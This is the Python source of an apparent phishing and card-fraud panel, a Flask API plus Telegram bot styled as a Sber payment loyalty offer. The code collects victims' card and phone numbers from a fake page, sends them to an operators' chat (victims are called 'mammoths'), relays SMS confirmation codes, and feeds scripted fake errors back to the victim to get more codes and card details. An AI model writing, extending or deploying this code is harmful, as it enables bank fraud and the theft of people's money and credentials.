#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Valentine Sale Bot - полная версия с aiogram
"""

import asyncio
import logging
import random
import string
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.session.aiohttp import AiohttpSession
from aiohttp import BasicAuth
from aiohttp_socks import ProxyConnector

from flask import Flask, request, jsonify
from flask_cors import CORS
import threading

from config import (
    BOT_TOKEN, CHAT_ID, API_HOST, API_PORT,
    PROXY_URL, FIRST_ERRORS, CODE_ERRORS, BIN_DATABASE
)
from database import Log, init_db

# ============================================
# ЛОГИРОВАНИЕ
# ============================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# AIOGRAM БОТ
# ============================================
connector = ProxyConnector.from_url(PROXY_URL)
session = AiohttpSession(connector=connector)
bot = Bot(token=BOT_TOKEN, session=session)
dp = Dispatcher()
router = Router()

# ============================================
# FLASK API
# ============================================
app = Flask(__name__)
CORS(app)

# ============================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================

def generate_log_id():
    """Генерация ID лога"""
    return ''.join(random.choices(string.digits, k=8))

def get_bank(card_number):
    """Определение банка по BIN"""
    card = card_number.replace(' ', '').replace('-', '')[:6]
    for prefix, bank in BIN_DATABASE.items():
        if card.startswith(prefix):
            return bank
    return 'Неизвестный банк'

def get_device(user_agent):
    """Определение устройства"""
    ua = user_agent.lower()
    if 'android' in ua:
        return 'Android 📱'
    elif 'iphone' in ua or 'ipad' in ua:
        return 'iOS 📱'
    elif 'windows' in ua:
        return 'Windows 💻'
    elif 'mac' in ua:
        return 'MacOS 💻'
    return 'Unknown'

def get_card_last4(card):
    """Последние 4 цифры карты"""
    clean = card.replace(' ', '').replace('-', '')
    return clean[-4:] if len(clean) >= 4 else '****'

# ============================================
# КЛАВИАТУРЫ
# ============================================

def get_waiting_keyboard(log_id):
    """Клавиатура для ожидающего лога"""
    builder = InlineKeyboardBuilder()
    
    builder.row(
        InlineKeyboardButton(text="📋 Взять лог", callback_data=f"take:{log_id}")
    )
    
    # Первые ошибки в ряд по 2
    errors = list(FIRST_ERRORS.keys())
    for i in range(0, len(errors), 2):
        row = [InlineKeyboardButton(text=errors[i], callback_data=f"first_error:{i}:{log_id}")]
        if i + 1 < len(errors):
            row.append(InlineKeyboardButton(text=errors[i+1], callback_data=f"first_error:{i+1}:{log_id}"))
        builder.row(*row)
    
    builder.row(
        InlineKeyboardButton(text="📷 QR", callback_data=f"qr:{log_id}")
    )
    
    return builder.as_markup()

def get_code_keyboard(log_id):
    """Клавиатура после взятия лога (ожидание кода)"""
    builder = InlineKeyboardBuilder()
    
    builder.row(
        InlineKeyboardButton(text="🔄 Новый код", callback_data=f"code_error:0:{log_id}"),
        InlineKeyboardButton(text="❌ Неверный код", callback_data=f"code_error:1:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="1/2", callback_data=f"half:1:{log_id}"),
        InlineKeyboardButton(text="1/3", callback_data=f"half:2:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="😠 900 1.0", callback_data=f"code_error:2:{log_id}"),
        InlineKeyboardButton(text="😠 900 2.0", callback_data=f"code_error:3:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="💰 Баланс 1.0", callback_data=f"code_error:4:{log_id}"),
        InlineKeyboardButton(text="💰 Баланс 2.0", callback_data=f"code_error:5:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🔄 Смена банка", callback_data=f"code_error:6:{log_id}"),
        InlineKeyboardButton(text="💳 Смена карты", callback_data=f"code_error:7:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="❌ Ошибка на ТП", callback_data=f"code_error:8:{log_id}"),
        InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"code_error:9:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="💵 Точный баланс", callback_data=f"code_error:10:{log_id}"),
        InlineKeyboardButton(text="✏️ Своя ошибка", callback_data=f"custom_error:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="✅ Успех", callback_data=f"success:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🔍 Проверить онлайн", callback_data=f"check_online:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="❓ Задать вопрос", callback_data=f"question:{log_id}"),
        InlineKeyboardButton(text="🏦 Сбер ЛК", callback_data=f"sber_lk:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🏦 ВТБ ЛК", callback_data=f"vtb_lk:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🔙 Назад на 3дс", callback_data=f"back_3ds:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="📷 QR", callback_data=f"qr:{log_id}")
    )
    
    return builder.as_markup()

# ============================================
# ФОРМАТИРОВАНИЕ СООБЩЕНИЙ
# ============================================

def format_waiting_message(log: Log):
    """Сообщение для ожидающего лога"""
    return f"""⚠️ <b>Мамонт ожидает код.</b>

🆔 <b>ID Ссылки:</b> {log.id}
🌐 <b>Сервис:</b> Sber Оплата
📋 <b>Название:</b> Эксклюзивная программа лояльности
💰 <b>Сумма:</b> 15000 RUB

💳 <b>Карта:</b> <code>{log.card}</code>
📅 <b>Дата:</b> null
🔒 <b>CVC:</b> null
💵 <b>Баланс:</b> Чекер не включен

📞 <b>Номер телефона:</b> <code>{log.phone}</code>

🏦 <b>Банк:</b> {log.bank}"""

def format_taken_message(log: Log):
    """Сообщение для взятого лога"""
    return f"""👤 <b>Воркер:</b> @{log.worker_name}[{log.worker_id}]
🆔 <b>ID Ссылки:</b> {log.id}
🌐 <b>Сервис:</b> Sber Оплата
📋 <b>Название:</b> Эксклюзивная программа лояльности
💰 <b>Сумма:</b> 15000 RUB

💳 <b>Карта:</b> <code>{log.card}</code>
📅 <b>Дата:</b> null
🔒 <b>CVC:</b> null
💵 <b>Баланс:</b> Чекер не включен

📞 <b>Номер телефона:</b> <code>{log.phone}</code>

🏦 <b>Банк:</b> {log.bank} ❤️"""

def format_code_message(log: Log, code: str):
    """Сообщение с кодом"""
    return f"""🔐 <b>КОД ПОЛУЧЕН!</b>

👤 <b>Воркер:</b> @{log.worker_name}[{log.worker_id}]
🆔 <b>ID:</b> {log.id}

💳 <b>Карта:</b> <code>{log.card}</code>
📞 <b>Телефон:</b> <code>{log.phone}</code>

📨 <b>СМС Код:</b> <code>{code}</code>

🏦 <b>Банк:</b> {log.bank}"""

# ============================================
# ОБРАБОТЧИКИ БОТА
# ============================================

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("🤖 Valentine Sale Bot запущен!\n\nОжидаю логи...")

@router.callback_query(F.data.startswith("take:"))
async def take_log(callback: types.CallbackQuery):
    """Взять лог"""
    log_id = callback.data.split(":")[1]
    log = Log.get_by_id(log_id)
    
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    if log.status != 'waiting':
        await callback.answer("❌ Лог уже взят", show_alert=True)
        return
    
    # Берём лог
    worker_name = callback.from_user.username or callback.from_user.first_name
    log.take(callback.from_user.id, worker_name)
    
    # Обновляем сообщение
    await callback.message.edit_text(
        text=format_taken_message(log),
        parse_mode='HTML',
        reply_markup=get_code_keyboard(log_id)
    )
    
    await callback.answer("✅ Лог взят!")

@router.callback_query(F.data.startswith("first_error:"))
async def first_error(callback: types.CallbackQuery):
    """Ошибка на первом этапе"""
    parts = callback.data.split(":")
    error_idx = int(parts[1])
    log_id = parts[2]
    
    log = Log.get_by_id(log_id)
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    errors = list(FIRST_ERRORS.keys())
    error_key = errors[error_idx]
    error_text = FIRST_ERRORS[error_key]
    
    log.update_status('error', error_text)
    
    await callback.message.edit_reply_markup(
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"❌ {error_key}", callback_data="_")]
        ])
    )
    
    await callback.answer(f"Отправлена ошибка: {error_key}")

@router.callback_query(F.data.startswith("code_error:"))
async def code_error(callback: types.CallbackQuery):
    """Ошибка на этапе кода"""
    parts = callback.data.split(":")
    error_idx = int(parts[1])
    log_id = parts[2]
    
    log = Log.get_by_id(log_id)
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    errors = list(CODE_ERRORS.keys())
    error_key = errors[error_idx]
    error_text = CODE_ERRORS[error_key]
    
    if error_text == "new_code":
        log.update_status('code', "Запрошен новый код")
        await callback.answer("🔄 Запрошен новый код")
    elif error_text == "custom_error":
        await callback.answer("✏️ Отправьте свой текст ошибки ответом на это сообщение")
    else:
        log.update_status('error', error_text)
        await callback.message.edit_reply_markup(
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"❌ {error_key}", callback_data="_")]
            ])
        )
        await callback.answer(f"Отправлена ошибка")

@router.callback_query(F.data.startswith("success:"))
async def success_log(callback: types.CallbackQuery):
    """Успешное завершение"""
    log_id = callback.data.split(":")[1]
    log = Log.get_by_id(log_id)
    
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    log.update_status('success')
    
    await callback.message.edit_text(
        text=callback.message.text + "\n\n✅ <b>УСПЕШНО ЗАВЕРШЕНО</b>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Успех", callback_data="_")]
        ])
    )
    
    await callback.answer("✅ Успешно!")

@router.callback_query(F.data.startswith("half:"))
async def half_sum(callback: types.CallbackQuery):
    """1/2 или 1/3 суммы"""
    parts = callback.data.split(":")
    half_type = parts[1]
    log_id = parts[2]
    
    if half_type == "1":
        await callback.answer("Отправлено: сумма 1/2")
    else:
        await callback.answer("Отправлено: сумма 1/3")

@router.callback_query(F.data == "_")
async def empty_callback(callback: types.CallbackQuery):
    await callback.answer()

# Регистрация роутера
dp.include_router(router)

# ============================================
# FLASK API ENDPOINTS
# ============================================

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok'})

@app.route('/api/log', methods=['POST'])
def create_log():
    """Создание нового лога"""
    data = request.json
    log_id = generate_log_id()
    
    card = data.get('card', '-')
    phone = data.get('phone', '-')
    user_agent = request.headers.get('User-Agent', '')
    
    log = Log(
        id=log_id,
        card=card,
        phone=phone,
        bank=get_bank(card) if card != '-' else '-',
        device=get_device(user_agent),
        status='waiting'
    )
    log.save()
    
    # Отправляем в Telegram асинхронно
    asyncio.run(send_log_to_telegram(log))
    
    return jsonify({'success': True, 'log_id': log_id})

async def send_log_to_telegram(log: Log):
    """Отправка лога в Telegram"""
    try:
        message = await bot.send_message(
            chat_id=CHAT_ID,
            text=format_waiting_message(log),
            parse_mode='HTML',
            reply_markup=get_waiting_keyboard(log.id)
        )
        log.message_id = message.message_id
        log.save()
    except Exception as e:
        logger.error(f"Error sending to Telegram: {e}")

@app.route('/api/log/<log_id>/status', methods=['GET'])
def get_status(log_id):
    """Получение статуса лога"""
    log = Log.get_by_id(log_id)
    
    if not log:
        return jsonify({'error': 'Not found'}), 404
    
    return jsonify({
        'status': log.status,
        'error': log.error_text,
        'card_last4': get_card_last4(log.card) if log.card != '-' else None
    })

@app.route('/api/log/<log_id>/code', methods=['POST'])
def submit_code(log_id):
    """Отправка кода"""
    log = Log.get_by_id(log_id)
    
    if not log:
        return jsonify({'error': 'Not found'}), 404
    
    data = request.json
    code = data.get('code', '')
    
    log.add_code(code)
    
    # Отправляем код в Telegram
    asyncio.run(send_code_to_telegram(log, code))
    
    return jsonify({'success': True})

async def send_code_to_telegram(log: Log, code: str):
    """Отправка кода в Telegram"""
    try:
        await bot.send_message(
            chat_id=CHAT_ID,
            text=format_code_message(log, code),
            parse_mode='HTML',
            reply_markup=get_code_keyboard(log.id)
        )
    except Exception as e:
        logger.error(f"Error sending code to Telegram: {e}")

# ============================================
# ЗАПУСК
# ============================================

def run_flask():
    """Запуск Flask"""
    app.run(host=API_HOST, port=API_PORT, debug=False, use_reloader=False)

async def main():
    """Главная функция"""
    # Запускаем Flask в отдельном потоке
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    logger.info(f"🚀 API запущен на {API_HOST}:{API_PORT}")
    logger.info("🤖 Запускаем Telegram бота...")
    
    # Запускаем бота
    await dp.start_polling(bot)

if __name__ == '__main__':
    init_db()
    asyncio.run(main())
